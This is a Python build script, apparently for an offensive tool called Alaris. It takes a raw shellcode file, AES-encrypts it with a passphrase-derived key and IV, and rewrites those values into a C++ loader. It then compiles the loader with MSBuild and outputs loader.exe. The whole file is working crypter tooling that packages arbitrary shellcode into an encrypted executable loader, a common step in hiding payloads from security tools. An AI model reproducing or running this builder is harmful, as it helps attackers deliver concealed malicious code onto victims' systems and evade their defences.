import re
import os
import sys
import shutil
import base64
import binascii
import argparse
import mimetypes
import subprocess
import pbkdf2
from binaryornot.check import is_binary
from Crypto.Cipher import AES
from colorama import Fore, Back, Style


def replace_key_iv_shellcode(key: str, iv: str, shellcode: str ) -> bool:
    """
    Replaces the AES Key and IV in loader.cpp
    """
    try:
        key_re = re.compile(r'uint8_t\skey\[\d{1,2}\]\s=\s.*')
        iv_re = re.compile(r'uint8_t\siv\[\d{1,2}\]\s=\s.*')
        shell_re = re.compile(r'shellcode\s=\s\"[+\"\/\r\n\t\saA0-zZ9]+\;')
        loader_path = f"{os.getcwd()}/loader/loader/loader.cpp"

        # Repace the variables in the cpp file
        raw_in = open(loader_path, 'rt')
        cpp = raw_in.read()
        cpp_bak = cpp
        cpp = key_re.sub(key, cpp)
        cpp = iv_re.sub(iv, cpp)
        cpp = shell_re.sub(shellcode, cpp)
        raw_in.close()

        # re-write the cpp file
        raw_out = open(loader_path, "wt")
        raw_out.write(cpp)
        raw_out.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        print(f"\t- Reverting code")
        raw_out = open(loader_path, "wt")
        raw_out.write(cpp_bak)
        raw_out.close()
        return False


def get_msbuild_path() -> str:
    """
    Uses the vswhere.exe application to enumerate the current Visual Studio
    installed on the host. This is used to build a proper msbuild.exe path.
    """
    try:
        p_files = os.getenv("ProgramFiles(x86)")
        cmd = f"\"{p_files}\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath"
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        out, err = p.communicate()
        if p.returncode != 0:
            raise Exception("Cannot Find Visual Studio 2019+ Installation")
        return f"\"{out.decode('utf-8').strip()}\MSBuild\Current\Bin\MSBuild.exe\""
    except KeyError as e:
        print(f"KeyError: {e}; Error: {err.decode()}")
        exit(1)
    except Exception as e:
        print(f"Generic Error: {e}; Error: {err.decode()}")
        exit(1)


def compile() -> bool:
    """
    Compile the shellcode loader w/ msbuild
    """
    try:
        msbuild = get_msbuild_path()
        project_file = f"{os.getcwd()}/loader/Alaris.sln"
        cmd = f"{msbuild} {project_file}"
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        out, err = p.communicate()
        if p.returncode != 0:
            raise Exception(f"Ouput:{out}; Error:{err}")
        return True
    except Exception as e:
        print(f"Compile Error: {e}")
        return False


def aes_pad(data: bytes) -> bytes:
    """
    Pad the data to make sure we are %16 == 0
    """
    bs = AES.block_size
    while len(data) % bs != 0:
        data += b"\x90"

    return data


def get_crypto_data(password: str) -> tuple:
    """
    Uses pbkdf2 to build a KEY and IV pair.
    """
    salt = os.urandom(16)
    key = pbkdf2.PBKDF2(password, salt).read(32)
    iv = pbkdf2.PBKDF2(password, salt).read(48)[32:]
    return (key, iv, salt)


def build_c_vars(data: bytes) -> str:
    """
    Takes in any string, separates for each 2 chars, assumes they're
    bytes and puts it into proper C syntax for byte array.
    """
    data = binascii.hexlify(data).decode("utf-8")
    split_data = re.findall("..", data)
    c_data = ""
    for i, b in enumerate(split_data):
        if i == (len(split_data) - 1):
            c_data += f"0x{b}"
        else:
            c_data += f"0x{b},"
    return c_data


def move_binary(path: str) -> str:
    """
    Moves the binary to a user defined directory
    """
    current_location = f"{os.getcwd()}/loader/x64/Release/loader.exe"

    # remove duplicates
    if os.path.exists(f"{path}/loader.exe"):
        os.remove(f"{path}/loader.exe")

    if ".exe" in path:
        exe_path = os.path.dirname(path)

        if os.path.exists(exe_path):
            shutil.move(current_location, path)
        else:
            path = os.getcwd()
            shutil.move(current_location, path)
    else:
        shutil.move(current_location, path)
        path = path + "loader.exe"

    return path


def is_max_string(string: str) -> bool:
    """
    The max string size, no matter what, is 65535 bytes, check
    to see if were' above that
    """
    cpp_max_string_size = 65535
    if sys.getsizeof(string) >= cpp_max_string_size:
        return True
    return False


def is_max_string_singleline(string: str) -> bool:
    """
    Checks to make sure the Base64 Shellcode string is not too
    large. https://docs.microsoft.com/en-us/cpp/error-messages/compiler-errors-1/compiler-error-c2026?view=msvc-160&viewFallbackFrom=vs-2019
    """
    cpp_max_size = 16380
    if len(string) >= cpp_max_size:
        return True
    return False


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> str:
    """
    Takes in data to encrypt, a key, and an iv. Encrypts the
    data with AES256, encodes the encrypted bytes with base64.
    """
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    encrypted_data = cipher.encrypt(data)
    return base64.b64encode(encrypted_data).decode("utf-8")


def build_c_shellcode(code: str) -> str:
    """
    C++ has a max single line string length (see is_max_string()),
    the workaround is to create a multiline std::string variable
    for shellcode that will be > 16,380 characters. This function does
    just that.
    """
    split_string = [code[i:i+2048] for i in range(0, len(code), 2048)]
    final_string = "shellcode = "
    for line in split_string:
        final_string += f"\"{line}\"\n"
    final_string += ";"
    return final_string


def parse_shellcode(shellcode_file: str) -> bytes:
    """
    Takes in a filepath as a parameter, verifies it's a binary file (raw)
    and parses the shellcode from within
    """
    if not os.path.exists(shellcode_file):
        print(f"[!] ERROR: {shellcode_file} does not exist")
        exit(1)

    # Check if the file is a binary (RAW) file
    if is_binary(shellcode_file):
        with open(shellcode_file, "rb") as f:
            data = f.read()
        return data
    else:
        print(f"[!] ERROR: Shellcode not in binary (bin,raw) format")
        exit(1)



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-s",
        "--shellcode",
        metavar="",
        dest="sc_file",
        required=True,
        help="Path to RAW shellcode file",
    )
    parser.add_argument(
        "-p",
        "--password",
        metavar="",
        dest="enc_pass",
        required=True,
        help="Encryption Passphrase",
    )
    parser.add_argument(
        "-o",
        "--out",
        metavar='',
        dest="out_path",
        default=os.getcwd(),
        required=False,
        help="Output Path for compiled binary"
    )

    args = parser.parse_args()

    key, iv, salt = get_crypto_data(args.enc_pass)
    c_key = "uint8_t key[32] = {%s};" % build_c_vars(key)
    c_iv = "uint8_t iv[16] = {%s};" % build_c_vars(iv)
    print(f"{Fore.CYAN}[i] Key, IV Generation:{Fore.GREEN}\tSuccessful{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] Key:{Fore.MAGENTA}\t{binascii.hexlify(key).decode('utf-8')}{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] IV:{Fore.MAGENTA}\t\t{binascii.hexlify(iv).decode('utf-8')}{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] Salt:{Fore.MAGENTA}\t{binascii.hexlify(salt).decode('utf-8')}{Fore.RESET}")

    # Parsing and Encryption of Shellcode
    raw_shellcode = parse_shellcode(args.sc_file)
    raw_padded_shellcode = aes_pad(raw_shellcode)
    encrypted_encoded_shellcode = aes_encrypt(raw_padded_shellcode, key, iv)
    print(f"{Fore.CYAN}[i] Encrypt Shellcode:{Fore.GREEN}\tSuccessful{Fore.RESET}")

    c_shellcode = f"shellcode = \"{encrypted_encoded_shellcode}\";"

    if is_max_string(encrypted_encoded_shellcode):
        print(f"{Fore.RED}[!] You shellcode is larger than C++ Max String size of 65535 bytes, this probably wont compile...{Fore.RESET}")
        print(f"{Fore.RED}[i] https://docs.microsoft.com/en-us/cpp/c-language/maximum-string-length?view=msvc-160{Fore.RESET}")
        ans = input(f"{Fore.GREEN}Try Anyway? (Y|N): {Fore.RESET}")
        if ans.lower() == "n" or ans.lower() == "no":
            exit(1)

    if is_max_string_singleline(encrypted_encoded_shellcode):
        c_shellcode= build_c_shellcode(encrypted_encoded_shellcode)

    if replace_key_iv_shellcode(c_key, c_iv, c_shellcode):
        print(f"{Fore.CYAN}[i] Variable Swap:{Fore.GREEN}\tSuccessful{Fore.RESET}")
        if compile():
            print(f"{Fore.CYAN}[i] Compiling:{Fore.GREEN}\t\tSuccessful{Fore.RESET}")
            print(f"{Fore.CYAN}[i] Binary Location:{Fore.MAGENTA}\t{move_binary(args.out_path)}{Fore.RESET}")

